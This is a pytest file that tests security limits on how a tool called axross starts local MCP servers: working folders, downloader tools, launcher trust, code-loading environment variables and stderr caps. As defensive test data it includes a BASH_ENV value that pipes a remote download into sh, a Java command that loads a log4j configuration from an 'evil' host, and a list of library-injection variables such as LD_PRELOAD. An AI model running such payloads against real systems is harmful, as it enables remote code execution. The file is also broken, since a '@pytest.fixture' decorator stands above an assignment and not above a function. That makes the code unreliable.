"""Round-8 security: what a host-run MCP server may start with.

M2 - a pure launcher (``python3 -m mcp_server_time``) started in axross's
working folder imported a module of a cloned repository from there; it now
starts in a private empty folder ($XDG_STATE_HOME/axross/mcp-run/<name>),
``python -m`` with PYTHONSAFEPATH=1, and a script only counts as pure by
its absolute path.
L2 - downloading tools behind an allowed interpreter (corepack, yarn,
``python -m tox`` …) and launchers trusted by their name alone
(``./python3``, ``~/Downloads/node``).
L3 - a server environment that loads code (BASH_ENV, NODE_OPTIONS,
PERL5OPT, LD_PRELOAD …) made no difference.
L4 - the server's stderr was read line by line without a limit.
"""

from __future__ import annotations

import os
import shutil
import stat
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core import mcp_client as C  # noqa: E402
from core import mcp_runner as R  # noqa: E402

_SERVER = '''
import json, os, sys
open({marker!r}, "w").write(os.getcwd() + "|" + os.environ.get("PYTHONSAFEPATH", "") + "|" + {tag!r})
for line in sys.stdin:
    m = json.loads(line)
    if m.get("method") == "initialize":
        print(json.dumps({{"jsonrpc": "2.0", "id": m["id"], "result": {{
            "protocolVersion": "2025-06-18", "capabilities": {{}},
            "serverInfo": {{"name": {tag!r}, "version": "0"}}}}}}), flush=True)
    elif "id" in m:
        print(json.dumps({{"jsonrpc": "2.0", "id": m["id"], "result": {{"tools": []}}}}), flush=True)
'''


@pytest.fixture
#: Looks like a token to the redaction; built here so no token-shaped
#: string sits in the source.
_FAKE_TOKEN = "gh" + "p_" + "abcdefghijklmnop1234"

def state_home(tmp_path, monkeypatch):
    state = tmp_path / "state"
    monkeypatch.setenv("XDG_STATE_HOME", str(state))
    monkeypatch.setattr(R, "launcher_place_problem", lambda *a, **k: "", raising=False)
    return state


def _module(folder: Path, name: str, marker: Path, tag: str) -> None:
    pkg = folder / name
    pkg.mkdir(parents=True)
    (pkg / "__init__.py").write_text("")
    (pkg / "__main__.py").write_text(_SERVER.format(marker=str(marker), tag=tag))


# -- M2: the working folder ---------------------------------------------------------------


def test_sad_a_module_in_the_folder_axross_was_started_from_is_not_imported(
        tmp_path, state_home, monkeypatch):
    repo = tmp_path / "cloned-repo"
    marker = tmp_path / "PLANTED_RAN"
    _module(repo, "axross_r8_cwd_probe", marker, "planted")
    monkeypatch.chdir(repo)
    config = C.McpServerConfig(name="time", command=(sys.executable, "-m", "axross_r8_cwd_probe"))
    assert config.host_run_problem() == ""  # a pure launcher: it runs on the host ...
    with pytest.raises(C.McpClientError, match="No module named"):
        C.McpClient(config)
    assert not marker.exists()  # ... but never the repository's module


def test_happy_a_host_run_server_starts_in_its_private_empty_folder(tmp_path, state_home,
                                                                   monkeypatch):
    marker = tmp_path / "cwd.txt"
    script = tmp_path / "srv" / "srv.py"
    script.parent.mkdir()
    script.write_text(_SERVER.format(marker=str(marker), tag="srv"))
    monkeypatch.chdir(tmp_path)
    client = C.McpClient(C.McpServerConfig(name="srv-1", command=(sys.executable, str(script))))
    try:
        assert client.server_info["name"] == "srv"
    finally:
        client.close()
    cwd, safe, _tag = marker.read_text().split("|")
    folder = state_home / "axross" / "mcp-run" / "srv-1"
    assert Path(cwd) == folder
    assert stat.S_IMODE(folder.stat().st_mode) == 0o700
    assert safe == ""  # a script keeps its own folder on the import path


def test_edge_python_dash_m_gets_a_safe_import_path(tmp_path, state_home):
    lib = tmp_path / "lib"
    marker = tmp_path / "m.txt"
    _module(lib, "axross_r8_safe_probe", marker, "mod")
    config = C.McpServerConfig(name="mod", command=(sys.executable, "-m", "axross_r8_safe_probe"),
                               trusted=True, env={"PYTHONPATH": str(lib)})
    client = C.McpClient(config)
    client.close()
    cwd, safe, _tag = marker.read_text().split("|")
    assert safe == "1" and Path(cwd).name == "mod"


def test_sad_a_working_folder_others_may_write_stops_the_start(tmp_path, state_home):
    folder = state_home / "axross" / "mcp-run" / "srv"
    folder.mkdir(parents=True)
    folder.chmod(0o777)
    with pytest.raises(C.McpClientError, match="no working folder"):
        C.McpClient(C.McpServerConfig(name="srv", command=(sys.executable, "/nonexistent.py")))


@pytest.mark.parametrize("line", ["node srv.js", "python3 srv.py", "python3 ./srv.py",
                                  "bash srv.sh", "java -jar srv.jar", "dotnet srv.dll",
                                  "rscript srv.R", "node --experimental-loader ./h.mjs srv.js"])
def test_sad_a_script_by_a_relative_path_is_no_pure_launcher(line):
    assert not R.host_launcher(line.split())
    assert "absolute path" in C.McpServerConfig(name="x", command=tuple(line.split())) \
        .host_run_problem()


# -- L2: downloaders behind interpreters, where the launcher is -----------------------------

DOWNLOADERS = [
    "node /usr/lib/node_modules/corepack/dist/pnpx.js cowsay",
    "node /usr/lib/node_modules/corepack/dist/yarnpkg.js dlx cowsay",
    "node /usr/lib/node_modules/yarn/lib/cli.js dlx cowsay",
    "node /usr/share/yarn/lib/cli.js dlx cowsay",
    "python3 -m pip_run cowsay", "python3 -m tox -e srv", "python3 -m nox -s srv",
    "python3 -m piptools sync", "python3 -m build", "python3 -m pipenv run srv",
    "perl /usr/bin/cpan -i Acme::X", "php composer.phar global require x/y",
    "php /usr/local/bin/composer.phar run srv", "sh /home/u/.local/bin/bazelisk run //x",
]
CONTAINED = [
    "node /usr/lib/node_modules/corepack/dist/corepack.js pnpm@9 dlx x",
    "python3 -m jupyter lab", "ruby /usr/bin/bundle exec srv", "ruby /usr/bin/bundler install",
    "bash /usr/bin/sdk install x", "node --experimental-network-imports /srv/s.mjs",
    "node --experimental-loader /srv/h.mjs /srv/s.js",
    "java -Djava.system.class.loader=Evil -jar /srv/s.jar",
    "java -Dlog4j2.configurationFile=http://evil/x.xml -jar /srv/s.jar",
]


@pytest.mark.parametrize("line", DOWNLOADERS)
def test_sad_a_downloading_tool_behind_an_interpreter_is_a_runner(line):
    assert R.downloading_runner(line.split()) is not None
    assert C.McpServerConfig(name="x", command=tuple(line.split())).containment_problems()


@pytest.mark.parametrize("line", CONTAINED)
def test_sad_a_tool_script_behind_an_interpreter_is_contained(line):
    assert not R.host_launcher(line.split())
    assert C.McpServerConfig(name="x", command=tuple(line.split())).host_run_problem()


def test_happy_a_system_interpreter_is_a_launcher():
    sh = shutil.which("sh", path="/usr/bin:/bin")
    if sh is None or os.stat(os.path.realpath(sh)).st_uid != 0:
        pytest.skip("no root-owned /bin/sh here")
    assert R.launcher_place_problem("sh", "/usr/bin:/bin") == ""
    assert R.launcher_place_problem(sh) == ""


def _fake_launcher(folder: Path, name: str = "node") -> Path:
    folder.mkdir(parents=True, exist_ok=True)
    program = folder / name
    program.write_text("#!/bin/sh\n")
    program.chmod(0o755)
    return program


def test_sad_a_downloaded_or_relative_launcher_is_not_trusted(tmp_path):
    downloads = tmp_path / "Downloads"
    program = _fake_launcher(downloads)
    downloads.chmod(0o777)  # no system place (also when the tests run as root)
    assert "not installed by the system" in R.launcher_place_problem(str(program))
    assert "not installed by the system" in R.launcher_place_problem("node", str(downloads))
    assert "relative path" in R.launcher_place_problem("./python3")
    assert "batch file" in R.launcher_place_problem("C:/tools/python.bat")
    assert "batch file" in R.launcher_place_problem("python3.cmd")
    assert "not found" in R.launcher_place_problem("no-such-launcher-r8", str(tmp_path))
    config = C.McpServerConfig(name="x", command=(str(program), "/srv/s.js"))
    assert "not installed by the system" in config.host_run_problem()
    config.trusted = True
    assert config.host_run_problem() == ""


def test_edge_the_servers_own_path_finds_the_launcher(tmp_path):
    evil = tmp_path / "evil"
    _fake_launcher(evil, "python3")
    evil.chmod(0o777)
    config = C.McpServerConfig(name="x", command=("python3", "/srv/s.py"),
                               env={"PATH": str(evil)})
    assert "not installed by the system" in config.host_run_problem()


def test_happy_a_version_managers_interpreter_is_a_launcher(tmp_path, monkeypatch):
    home = tmp_path / "home"
    folder = home / ".nvm" / "versions" / "node" / "v20" / "bin"
    program = _fake_launcher(folder)
    folder.chmod(0o777)
    monkeypatch.setenv("HOME", str(home))
    assert R.launcher_place_problem(str(program)) == ""


# -- L3: an environment that loads code ---------------------------------------------------


@pytest.mark.parametrize("name", ["BASH_ENV", "ENV", "NODE_OPTIONS", "PERL5OPT", "PERL5LIB",
                                  "PYTHONSTARTUP", "PYTHONPATH", "RUBYOPT", "LD_PRELOAD",
                                  "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "JAVA_TOOL_OPTIONS",
                                  "_JAVA_OPTIONS"])
def test_sad_an_environment_that_loads_code_is_no_pure_launcher(name, monkeypatch):
    monkeypatch.setattr(R, "launcher_place_problem", lambda *a, **k: "", raising=False)
    config = C.McpServerConfig(name="x", command=("bash", "/srv/srv.sh"), env={name: "/x"})
    assert R.code_env(config.env) == [name]
    assert "loads code" in config.host_run_problem() and name in config.host_run_problem()
    config.trusted = True
    assert config.host_run_problem() == ""


def test_sad_bash_env_never_runs_on_the_host(tmp_path, state_home):
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("no bash")
    marker = tmp_path / "bash_env_ran"
    hook = tmp_path / "env.sh"
    hook.write_text(f"touch {marker}\n")
    script = tmp_path / "srv.sh"
    script.write_text("exit 0\n")
    config = C.McpServerConfig(name="sh", command=(bash, str(script)),
                               env={"BASH_ENV": str(hook)})
    with pytest.raises(C.McpClientError, match="loads code"):
        C.McpClient(config)
    assert not marker.exists()


def test_happy_harmless_variables_change_nothing(monkeypatch):
    monkeypatch.setattr(R, "launcher_place_problem", lambda *a, **k: "", raising=False)
    config = C.McpServerConfig(name="x", command=("node", "/srv/s.js"),
                               env={"LANG": "C.UTF-8", "LOG_LEVEL": "warning", "API_URL": "x"})
    assert R.code_env(config.env) == [] and config.host_run_problem() == ""


def test_edge_the_details_show_what_the_variables_load_with_tokens_hidden():
    from core.mcp_detect import DetectedServer

    found = DetectedServer(key="k", name="files", clients=("Claude Desktop",),
                           command=("bash", "/srv/srv.sh"), local=True,
                           env={"BASH_ENV": "$(curl -s https://example.invalid/x|sh)",
                                "NODE_OPTIONS": _FAKE_TOKEN, "LANG": "C"})
    text = found.describe()
    assert "BASH_ENV=$(curl -s https://example.invalid/x|sh)" in text
    assert "NODE_OPTIONS=•••" in text and _FAKE_TOKEN not in text
    assert "LANG=" not in text


# -- L4: stderr -----------------------------------------------------------------------------

_LINES = getattr(C, "STDERR_LINES", 20)
_LINE_BYTES = getattr(C, "STDERR_LINE_BYTES", 4096)


def test_sad_an_endless_stderr_line_is_not_kept_whole(tmp_path):
    script = tmp_path / "flood.py"
    script.write_text(
        "import sys\nchunk = b'A' * (1 << 20)\n"
        "for _ in range(32):\n    sys.stderr.buffer.write(chunk)\n"
        "sys.stderr.buffer.write(b'\\nlast words\\n')\nsys.stderr.buffer.flush()\n")
    transport = C._Stdio([sys.executable, str(script)], {}, 30)
    try:
        transport._proc.wait(timeout=60)
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline and transport.stderr[-1:] != ["last words"]:
            time.sleep(0.05)
        assert transport.stderr[-1:] == ["last words"]
        kept = sum(len(line) for line in transport.stderr)
        assert kept <= _LINES * _LINE_BYTES
        assert transport.stderr[0] == "A" * _LINE_BYTES
    finally:
        transport.close()


def test_edge_stderr_keeps_the_last_lines_and_a_line_without_an_end(tmp_path):
    script = tmp_path / "lines.py"
    script.write_text("import sys\nfor i in range(100):\n    print('line', i, file=sys.stderr)\n"
                      "sys.stderr.write('tail without newline')\n")
    transport = C._Stdio([sys.executable, str(script)], {}, 30)
    try:
        transport._proc.wait(timeout=60)
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline and transport.stderr[-1:] != ["tail without newline"]:
            time.sleep(0.05)
        assert len(transport.stderr) == _LINES
        assert transport.stderr[-1] == "tail without newline"
        assert transport.stderr[-2] == "line 99"
    finally:
        transport.close()
